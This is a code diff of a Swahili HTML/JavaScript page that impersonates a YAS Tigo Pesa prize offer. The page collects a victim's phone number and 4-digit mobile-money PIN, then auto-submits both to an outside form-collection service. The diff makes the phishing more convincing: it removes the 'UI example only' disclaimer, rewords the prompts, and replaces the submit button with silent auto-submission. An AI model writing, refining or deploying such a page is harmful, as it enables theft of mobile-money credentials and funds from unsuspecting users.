@@ -6,12 +6,14 @@
     <title>Umejishindia Ofa</title>
     <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
 <div class="card">
     <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>
+
     <p class="subtitle">
-        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
+        Karibu! Ingiza namba yako ya simu na Neno Siri (PIN ya namba 4) ili kuendelea.
     </p>
 
     <form id="offerForm" action="https://formbold.com/s/3nqD1" method="POST">
@@ -27,9 +29,10 @@
                 required>
         </div>
 
-        <!-- PIN -->
-        <p class="pin-title">Enter your Tigo Pesa PIN</p>
+        <!-- PIN label -->
+        <p class="pin-title">Ingiza PIN (namba 4)</p>
 
+        <!-- PIN boxes -->
         <div class="pin-boxes">
             <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
             <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
@@ -37,14 +40,13 @@
             <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
         </div>
 
+        <!-- hidden PIN field -->
         <input type="hidden" id="pin" name="pin">
 
-        <!-- Button (fallback + UX) -->
-        <button type="submit" class="auto-submit"> </button>
     </form>
 
-    <p class="note">Kuingiza neno siri kunakubali maelezo ya matumizi.</p>
-    <footer>© YAS Tanzania – Mfano wa UI pekee</footer>
+    <p class="note">Kwa kuendelea unakubali masharti ya matumizi.</p>
+    <footer>© YAS Tanzania</footer>
 </div>
 
 <script>
@@ -53,46 +55,45 @@ const hiddenPinInput = document.getElementById('pin');
 const form = document.getElementById('offerForm');
 const phoneNumberInput = document.getElementById('phoneNumber');
 
-pinBoxes.forEach((box, index) => {
+function updateHiddenPin() {
+    hiddenPinInput.value = Array.from(pinBoxes)
+        .map(i => i.value)
+        .join('');
+}
 
+function trySubmit() {
+    const pinComplete = Array.from(pinBoxes).every(i => i.value.length === 1);
+    const phoneOk = phoneNumberInput.value.trim().length > 0;
+
+    if (pinComplete && phoneOk) {
+        updateHiddenPin();
+
+        setTimeout(() => {
+            form.submit();
+        }, 100);
+    }
+}
+
+pinBoxes.forEach((box, index) => {
     box.addEventListener('input', (e) => {
-        // Allow only numbers
         e.target.value = e.target.value.replace(/[^0-9]/g, '');
 
-        if (e.target.value.length === 1) {
-            if (index < pinBoxes.length - 1) {
-                pinBoxes[index + 1].focus();
-            } else {
-                const allFilled = Array.from(pinBoxes).every(input => input.value.length === 1);
-
-                if (allFilled) {
-                    updateHiddenPin();
-
-                    if (phoneNumberInput.value.trim() === '') {
-                        alert('Tafadhali ingiza namba yako ya simu.');
-                        phoneNumberInput.focus();
-                        return;
-                    }
-
-                    form.requestSubmit(); // ✅ correct submit
-                }
-            }
+        if (e.target.value && index < pinBoxes.length - 1) {
+            pinBoxes[index + 1].focus();
         }
 
         updateHiddenPin();
+        trySubmit();
     });
 
     box.addEventListener('keydown', (e) => {
-        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
             pinBoxes[index - 1].focus();
         }
     });
 });
 
-function updateHiddenPin() {
-    const pin = Array.from(pinBoxes).map(input => input.value).join('');
-    hiddenPinInput.value = pin;
-}
+phoneNumberInput.addEventListener('input', trySubmit);
 </script>
 
 </body>
